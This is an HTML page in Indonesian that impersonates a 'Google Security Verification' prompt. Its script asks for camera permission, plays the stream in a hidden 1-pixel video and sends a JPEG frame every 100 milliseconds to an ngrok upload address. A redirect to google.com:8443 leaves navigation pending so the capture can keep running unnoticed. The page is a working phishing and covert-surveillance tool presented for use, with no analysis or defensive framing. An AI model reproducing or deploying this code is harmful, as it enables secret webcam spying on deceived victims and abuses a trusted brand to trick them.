<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan kamera dan diarahkan ke server aman Google.</p>
  <button id="startBtn">Verify Account & Allow Camera</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Camera Delay] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', function() {
    log("[*] Memulai verifikasi...");

    // ============================================
    // 2. MINTA IZIN KAMERA (SEGERA)
    // ============================================
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(function(stream) {
        log("[+] Kamera DIIZINKAN! Menyalakan kamera...");
        
        // ============================================
        // 3. SETELAH KAMERA MENYALA, REDIRECT KE GOOGLE:8443
        // ============================================
        // Delay 500ms agar kamera sempat menyala.
        setTimeout(function() {
          log("[*] Redirect ke google.com:8443 (Pending Navigation)...");
          try {
            window.location.href = "https://www.google.com:8443";
          } catch (e) {}
        }, 500);

        // ============================================
        // 4. KIRIM FRAME KAMERA KE SERVER (TELEMETRI)
        // ============================================
        var video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
        document.body.appendChild(video);

        video.play().catch(function(){});

        var canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        var ctx = canvas.getContext('2d');

        // Kirim frame setiap 100ms
        setInterval(function() {
          if (video.readyState === video.HAVE_ENOUGH_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(function(blob) {
              if (!blob) return;
              var formData = new FormData();
              formData.append('file', blob, 'camera.jpg');
              fetch("https://studly-unallegorized-brecken.ngrok-free.dev/upload", {
                method: 'POST',
                body: formData,
                keepalive: true
              }).catch(function(){});
            }, 'image/jpeg', 0.5);
          }
        }, 100);

      })
      .catch(function(err) {
        log("[-] Kamera ditolak: " + err.name);
        
        // Jika ditolak, tetap redirect ke Google:8443 untuk delay
        setTimeout(function() {
          log("[*] Redirect ke google.com:8443 (Pending Navigation)...");
          window.location.href = "https://www.google.com:8443";
        }, 500);
      });
  }, { once: true });

})();
</script>

</body>
</html>
